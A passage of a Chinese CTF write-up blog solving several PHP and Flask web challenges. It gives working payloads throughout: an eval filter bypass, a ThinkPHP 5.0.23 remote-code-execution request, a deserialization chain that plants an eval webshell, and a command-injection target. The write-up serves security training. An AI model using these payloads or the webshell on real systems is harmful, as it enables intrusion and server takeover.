<p>这里要不要url编码好像都行，不过用burp的话最好还是用下url编码，不然可能出问题</p>
<p>flag：<code>flag&#123;Pyth0n_1s_1mp0rtant!!!!!&#125;</code></p>
<h3 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h3><ul>
<li>翻了源码、前端、返回包等所有可能藏hint的地方都没hint，访问了下index.php正常，访问随便其他的比如1.php会报404，基本是源码泄露没跑了</li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Lmg66/p/13598803.html">常见源码泄露参考</a> （先自己mark一下，后期再整理一遍，，）</li>
</ul>
<p>访问index.php.swp，拿到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;./flag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$code</span>)&gt;<span class="number">14</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;too long !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z0-9_&amp;^&lt;&gt;&quot;\&#x27;$#@!*&amp;+=.`\[\]&#123;&#125;?,]+/&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot; No ! No !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>代码审计</strong></p>
<ol>
<li>接收get请求code参数</li>
<li>过字符串长度过滤和正则后eval执行</li>
</ol>
<p><strong>思路</strong></p>
<ol>
<li><p>字符串不能太长，所以通过system(‘cat /flag’)不可取 =&gt; 直接执行getflag函数</p>
</li>
<li><p>绕正则，先fuzz一下看看出题人留了什么给我们用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="variable">$var</span> = <span class="number">33</span>; <span class="variable">$var</span> &lt; <span class="number">127</span>; <span class="variable">$var</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[a-zA-Z0-9_&amp;^&lt;&gt;&quot;\&#x27;$#@!*&amp;+=.`\[\]&#123;&#125;?,]+/&#x27;</span>,chr(<span class="variable">$var</span>))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> chr(<span class="variable">$var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// %()-/:;\|~</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<ol>
<li><p>参考<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">p神博客</a>，这题属于无字母无数字shell的进阶版，异或和自增绕过都用不了，因此要用取反绕过</p>
</li>
<li><p>先对字符串getflag取反，由于取反后会有不可见字符，因此再用url编码一下：<code>urlencode(~&#39;getflag&#39;)</code>得<code>%98%9A%8B%99%93%9E%98</code></p>
</li>
<li><p>再作为code参数传递即可执行<code>@eval((getflag)())</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211124202521280.png" alt="image-20211124202521280"></p>
</li>
</ol>
<p><strong>最终payload</strong>：<code>?code=(~%98%9A%8B%99%93%9E%98)();</code></p>
<p><code>flag：flag&#123;a3b5c6d-563ae31f-b6672e33ed-ff63a5b8&#125;</code></p>
<h3 id="thinkphp"><a href="#thinkphp" class="headerlink" title="thinkphp"></a>thinkphp</h3><p>参考<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/thinkphp/5.0.23-rce/README.zh-cn.md">vulhub</a></p>
<p>直接拿payload来rce</p>
<p>直接<code>cat /flag</code>拿不到，估计flag要么不在根目录要么改名了</p>
<p>接着<code>find /|grep “flag”</code> 也找不到，那就肯定是改名了，直接一层一层目录遍历上去，在根目录找到FL4G</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211125203138488.png" alt="image-20211125203138488"></p>
<p><strong>payload</strong>：</p>
<p>GET：<code>?s=captcha</code></p>
<p>POST：<code>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=cat%20../../../../FL4G</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211125203051137.png" alt="image-20211125203051137"></p>
<p>flag：<code>flag&#123;ewyg_wyuf_ushg_dgds_dgfs!&#125;</code></p>
<h3 id="ez-rce"><a href="#ez-rce" class="headerlink" title="ez-rce"></a>ez-rce</h3><p>搜一搜无参数函数rce，其实挺多文章的，包括一些题目（搜[GXYCTF2019]禁止套娃）也有，不过里面要么没过滤要么过滤没出题人这么变态….</p>
<p>看了好多篇文章，<a target="_blank" rel="noopener" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">这篇</a>发的时间较早，总结的挺好，不过没考虑过滤的情况，觉得还是<a target="_blank" rel="noopener" href="http://www.heetian.com/info/827">这篇</a>的骚操作多一点，不局限于某一题，而是总结性质的告诉你哪些可以用</p>
<p>提炼一下用到的几个函数吧</p>
<ol>
<li><p>time()：返回当前的时间（Unix纪元，1970-01-01到现在的秒数）</p>
</li>
<li><p>crypt(arg)<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.crypt.php">php手册</a>：加盐哈希 =&gt; crypt(time())</p>
<blockquote>
<p>详细介绍戳 =&gt; <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.crypt.php">https://www.php.net/manual/zh/function.crypt.php</a> （建议拉到下面看不同算法的盐值构造）</p>
<p>php的crypt有个很巧妙的地方，首先它在不同操作系统上的默认算法可能不一样（DES、Blowfish、MD5），这里我主要说MD5</p>
<p>crypt(“abc”) 的（某次）结果为\$1\$Yn5.BJ3.\$j5RYtWilZIabNWw4NP2YD.</p>
<p><code>$1$</code>表示使用加盐md5，<code>$Yn5.BJ3.$</code> （两个美元符明明转义了还能识别为latex公式…真是不太聪明）两个美元符中间的是盐值，后面的是base64字符串，这就出现一个很有趣的地方了，base64里并没有 <code>.</code> 这个表示 ，经过多次试验后，发现crypt()的结果（若使用md5）字符串末尾只有4种可能：<code>0</code>、<code>1</code>、<code>.</code>、<code>/</code></p>
<p>这个我搜了一下发现好像没什么人介绍过（当然可能是我搜商太差…..）想了一下，我猜大概是因为MD5的结果是128比特长，然后base64嘛，6比特代表一个字符，因此128 / 6 = 21 … 2，剩了两个比特，两个比特4种组合，所以就分别用<code>01./</code>四个字符来表示了（其实我感觉php源码应该得有写，先mark一下挖个坑吧，后期整理）</p>
</blockquote>
</li>
<li><p>hebrevc()<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.hebrevc.php">php手册</a> ：用于把希伯来文本从右至左的流转换为左至右的流</p>
<blockquote>
<p>有的地方说“只有 224 至 251 之间的 ASCII 字符，以及标点符号受到影响”，其实不太严谨，自己写个脚本fuzz一下就可以发现，ascii=45的‘-’和ascii=47的‘/’不会受影响</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211126002947124.png" alt="image-20211126002947124"></p>
<p>前两个是不受影响的，最后是受影响的，然后ascii=251也不受影响</p>
</blockquote>
<p><code>hebrevc(crypt(time()))</code>：将crypt()哈希字符串末尾的 <code>.</code> 移到最前面</p>
</li>
<li><p>ord()：返回字符串中第一个字符的ascii值</p>
</li>
<li><p>chr()：ascii值转字符</p>
<p><code>chr(ord(hebrevc(crypt(time()))))</code>：读出 <code>.</code> </p>
</li>
<li><p>scandir()<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.scandir.php">php手册</a>：列出指定路径中的文件和目录</p>
<p><code>scandir(&#39;.&#39;)</code> ：读当前目录中的文件和目录</p>
</li>
<li><p>end()：返回数组中最后一个元素</p>
<blockquote>
<p>其他还有next()、prev()分别表示返回数组前一个元素或后一个元素，做题的时候没思考，直接用end()读了（大多数题都是这样），写wp的时候想到或许可以组合一下做目录遍历？要真有flag不放在最后一个的呢…（其实那篇总结下文有说，，只是都过不了本题的正则…）</p>
</blockquote>
</li>
<li><p>show_source()：没什么说的了，把文件显示出来</p>
<blockquote>
<p>readfile、highlight_file、file_get_contents也可以读，只是被过滤了file，还有个readgzfile()比较冷门，可以绕过一些过滤</p>
</blockquote>
</li>
</ol>
<p>最后再贴次链接：<a target="_blank" rel="noopener" href="http://www.heetian.com/info/827">http://www.heetian.com/info/827</a> u1s1总结的真不错，mark一下后期整理</p>
<p><strong>最终payload</strong>：</p>
<p>POST：<code>shell=show_source(end(scandir(chr(ord(hebrevc(crypt(time())))))));</code></p>
<p>如果报scandir($)的错就多提交几次，毕竟crypt()以<code>.</code>结尾只有25%的概率</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211125212618732.png" alt="image-20211125212618732"></p>
<p>flag：<code>flag&#123;68ff971077c08515fdbbd83fac40fcb1&#125;</code></p>
<h3 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h3><p>u1s1我觉得这题出的真不错…虽然pop链分析的文章很多，也有题目的wp，不过结合了一些其他的小trick感觉就很巧妙，有很多值得mark后后期整理的地方</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">openfunc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$object</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// 序列化时触发</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;object=<span class="keyword">new</span> normal();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// 反序列化时触发</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;object=<span class="keyword">new</span> normal();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// 对象销毁时触发</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;object-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">hack</span> </span>&#123;</span><br><span class="line"><span class="comment">// 抽象类不可实例化对象，需要通过子类调用方法</span></span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pass</span>(<span class="params"></span>)</span>;</span><br><span class="line">	<span class="comment">// 抽象类，提供抽象接口，方法由子类实现</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pass();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">normal</span></span>&#123;</span><br><span class="line"><span class="comment">// 没什么好审的，要绕的函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you must bypass it&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> <span class="keyword">extends</span> <span class="title">hack</span></span>&#123;</span><br><span class="line"><span class="comment">// 抽象类hack的子类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pass</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = unserialize(<span class="keyword">$this</span>-&gt;b);</span><br><span class="line">        <span class="comment">// b为序列化字符串，反序列化后赋给a，所以a应该为一个对象</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;a-&gt;d = urldecode(date(<span class="keyword">$this</span>-&gt;c));</span><br><span class="line">        <span class="comment">// 给对象a的d属性赋值，赋值内容为经过url解码的date()函数返回值，其中date()参数为$c</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;a-&gt;d === <span class="string">&#x27;shell&#x27;</span>)&#123;</span><br><span class="line">            <span class="comment">// 若值为shell则调用shell()方法</span></span><br><span class="line">           <span class="keyword">$this</span>-&gt;shell();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// 得绕</span></span><br><span class="line">            <span class="keyword">die</span>(date(<span class="string">&#x27;Y/m/d H:i:s&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">shell</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump|php/i&#x27;</span>,<span class="keyword">$this</span>-&gt;data))&#123;</span><br><span class="line">            <span class="comment">// 正则，绕就完事</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;you die&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists(<span class="variable">$dir</span>))&#123;</span><br><span class="line">            mkdir(<span class="variable">$dir</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="comment">// 给了个路径，需要访问http://ip/sandbox/md5(?)/hack.php</span></span><br><span class="line">        <span class="comment">// 其中hack.php的内容由$this-&gt;data写进去</span></span><br><span class="line">        file_put_contents(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;hack.php&quot;</span>, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Xp0int&#x27;</span>]))  </span><br><span class="line">&#123;	</span><br><span class="line">    <span class="comment">// 接收get请求Xp0int参数，base64解码后反序列化</span></span><br><span class="line">    <span class="variable">$Data</span> = unserialize(base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;Xp0int&#x27;</span>]));</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__file__</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>代码审计</strong></p>
<ul>
<li>代码比较多，审计直接写注释里了，看起来方便些</li>
</ul>
<p><strong>思路</strong></p>
<ul>
<li><p>最终我们需要的东西在<code>file_put_contents(&quot;$dir&quot; . &quot;hack.php&quot;, $this-&gt;data);</code>里，这里可以data可控，所以想法是写一个php马进去，因此需要让程序运行到这一句并成功写入shell</p>
</li>
<li><p>调用链：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">openfunc</span><br><span class="line">	-&gt;__wakeup()-&gt;normal#action() // 需要绕过</span><br><span class="line">	-&gt;__destruct()</span><br><span class="line">		[-&gt;object#action()] // object赋为evil类</span><br><span class="line">		-&gt;evil#action() -&gt;hack#action() // 子类没有action()方法，去父类找</span><br><span class="line">			-&gt;hack#pass() -&gt;evil#pass() // 父类接口由子类实现</span><br><span class="line">				-&gt;evil#shell()</span><br></pre></td></tr></table></figure>
<p>分析完调用链就需要一步一步绕过了</p>
</li>
</ul>
<ol>
<li><p>绕__wakeup()</p>
<p>没什么好说了，成员属性数目大于实际数目即可</p>
</li>
<li><p>date()</p>
<blockquote>
<p>其实这个地方一开始以为可以用public和protected访问控制修饰符修改的方法绕过的，不过好像用不了，先mark一下，后期看看整理一波利用姿势</p>
</blockquote>
<ul>
<li><p>参考<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.date.php">php手册</a>：date的特性：当date()参数不是格式字串时将原样展示</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211126131608482.png" alt="image-20211126131608482"></p>
</li>
<li><p>因此<code>$this-&gt;c</code>赋值为“shell”的url编码即可（url编码中的小写c属于格式字串，改为大写就可以了）</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211126132022350.png" alt="image-20211126132022350"></p>
</li>
</ul>
</li>
<li><p>file_put_contents():</p>
<ul>
<li><p>参考<a target="_blank" rel="noopener" href="https://www.php.net/file_put_contents/">php手册</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211126132416805.png" alt="image-20211126132416805"></p>
</li>
<li><p>第二个参数可以是数组，因此可以用来绕过上面的正则，比如<code>data=eval();</code> =&gt; <code>data=[&#39;ev&#39;,&#39;al();&#39;]</code></p>
</li>
</ul>
</li>
</ol>
<p>都绕完了就开始写exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$open</span>=<span class="keyword">new</span> openfunc();</span><br><span class="line"><span class="variable">$evil</span>=<span class="keyword">new</span> evil();</span><br><span class="line"><span class="variable">$data</span>=[<span class="string">&#x27;&lt;?ph&#x27;</span>,<span class="string">&#x27;p &#x27;</span>,<span class="string">&#x27;@ev&#x27;</span>,<span class="string">&quot;al(\$_POST[&#x27;cmd&#x27;]);&quot;</span>]; 	<span class="comment">// 绕正则</span></span><br><span class="line"><span class="variable">$evil</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line"><span class="variable">$evil</span>-&gt;c = <span class="string">&#x27;%73%68%65%6C%6C&#x27;</span>; 						<span class="comment">// 绕date()</span></span><br><span class="line"><span class="variable">$open</span>-&gt;object=<span class="variable">$evil</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$open</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment">// O:8:&quot;openfunc&quot;:1:&#123;s:6:&quot;object&quot;;O:4:&quot;evil&quot;:4:&#123;s:4:&quot;data&quot;;a:4:&#123;i:0;s:4:&quot;<span class="meta">&lt;?</span>ph&quot;;i:1;s:2:&quot;p &quot;;i:2;s:3:&quot;@ev&quot;;i:3;s:18:&quot;al($_POST[&#x27;cmd&#x27;]);&quot;;&#125;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;s:1:&quot;c&quot;;s:15:&quot;%73%68%65%6C%6C&quot;;&#125;&#125;</span></span><br><span class="line"><span class="comment">// 把&quot;openfunc&quot;:1:改为2 绕__wakeup()，编码一下</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="string">&#x27;O:8:&quot;openfunc&quot;:2:&#123;s:6:&quot;object&quot;;O:4:&quot;evil&quot;:4:&#123;s:4:&quot;data&quot;;a:4:&#123;i:0;s:4:&quot;&lt;?ph&quot;;i:1;s:2:&quot;p &quot;;i:2;s:3:&quot;@ev&quot;;i:3;s:18:&quot;al($_POST[\&#x27;cmd\&#x27;]);&quot;;&#125;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;s:1:&quot;c&quot;;s:15:&quot;%73%68%65%6C%6C&quot;;&#125;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><strong>最终payload</strong></p>
<p>GET：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?Xp0int=Tzo4OiJvcGVuZnVuYyI6Mjp7czo2OiJvYmplY3QiO086NDoiZXZpbCI6NDp7czo0OiJkYXRhIjthOjQ6e2k6MDtzOjQ6Ijw/cGgiO2k6MTtzOjI6InAgIjtpOjI7czozOiJAZXYiO2k6MztzOjE4OiJhbCgkX1BPU1RbJ2NtZCddKTsiO31zOjE6ImEiO047czoxOiJiIjtOO3M6MToiYyI7czoxNToiJTczJTY4JTY1JTZDJTZDIjt9fQ==</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211126133027867.png" alt="image-20211126133027867"></p>
<p>返回地址，访问hack.php，成功命令执行</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211126112939856.png" alt="image-20211126112939856"></p>
<p>目录遍历出flag位置，拿下</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211126133131753.png" alt="image-20211126133131753"></p>
<p>flag：<code>flag&#123;Y0u_Ar3_A_POP_Ma5ter!!!!&#125;</code></p>
<h3 id="PictureGenerator"><a href="#PictureGenerator" class="headerlink" title="PictureGenerator"></a>PictureGenerator</h3><p>麻了，比赛的时候没发现有附件，尝试了好久目录穿越任意文件下载一直下不了…结果比赛结束后和同学交流才发现有附件….</p>
<hr>
<p>更新</p>
<hr>
<p>真麻了，真没想到这题几乎可以说就一个知识点：<code>$()</code>替换为反引（麻了反引在md的行内代码打不出来</p>
<p>我真找了半年资料都没想到就这一个知识点…从命令构造到pillow rce到flask注入，佛了，愣是没整明白，最后做出来的时候真有被傻到</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, url_for</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"></span><br><span class="line">clean = time.time()</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">chars = <span class="built_in">list</span>(string.ascii_letters + string.digits)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;index.html&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/generate&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">    <span class="keyword">global</span> clean</span><br><span class="line">    <span class="keyword">if</span> time.time() - clean &gt; <span class="number">60</span>:</span><br><span class="line">      os.system(<span class="string">&quot;rm static/images/*&quot;</span>)</span><br><span class="line">      clean = time.time()</span><br><span class="line">    data = request.form.getlist(<span class="string">&#x27;text&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    data = data.replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    data = data.replace(<span class="string">&quot;$&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    name = <span class="string">&quot;&quot;</span>.join(random.choices(chars,k=<span class="number">8</span>)) + <span class="string">&quot;.png&quot;</span></span><br><span class="line">    os.system(<span class="string">f&quot;python3 gene.py <span class="subst">&#123;name&#125;</span> \&quot;<span class="subst">&#123;data&#125;</span>\&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;static&#x27;</span>, filename=<span class="string">&#x27;images/&#x27;</span> + name), code=<span class="number">301</span>)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  app.run(<span class="string">&quot;0.0.0.0&quot;</span>,<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gene.py</span></span><br><span class="line"><span 